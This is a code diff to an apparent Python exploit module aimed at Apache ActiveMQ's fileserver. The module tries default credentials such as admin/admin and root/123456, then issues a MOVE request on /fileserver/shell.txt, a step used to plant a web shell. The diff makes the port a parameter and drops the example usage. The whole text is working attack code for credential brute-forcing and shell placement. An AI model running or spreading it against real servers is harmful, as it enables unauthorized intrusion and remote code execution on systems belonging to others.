@@ -12,8 +12,8 @@ def get_auth_header(username: str, password: str) -> str:
     return f"Basic {base64.b64encode(credentials.encode()).decode()}"
 
 
-def run(url: str) -> Optional[str]:
-    # List of users and passwords to try
+def run(url: str, port: int) -> Optional[str]:
+    address = f"{url}:{port}"
     users = ["admin", "user", "root"]
     passwords = ["admin", "password", "123456", ""]
 
@@ -26,7 +26,11 @@ def run(url: str) -> Optional[str]:
             try:
                 logger.info(f"Trying credentials: {user}:{pwd}")
                 response = requests.request(
-                    'MOVE', f"{url}:8161/fileserver/shell.txt", headers=headers, timeout=9, verify=False
+                    'MOVE',
+                    f"{address}/fileserver/shell.txt",
+                    headers=headers,
+                    timeout=9,
+                    verify=False
                 )
                 if response.status_code == 204:
                     logger.success(f"ActiveMQ move file success with {user}:{pwd}")
@@ -39,8 +43,3 @@ def run(url: str) -> Optional[str]:
 
     logger.warning("No valid credentials found")
     return None
-
-
-if __name__ == "__main__":
-    # Example usage
-    print(run("localhost"))
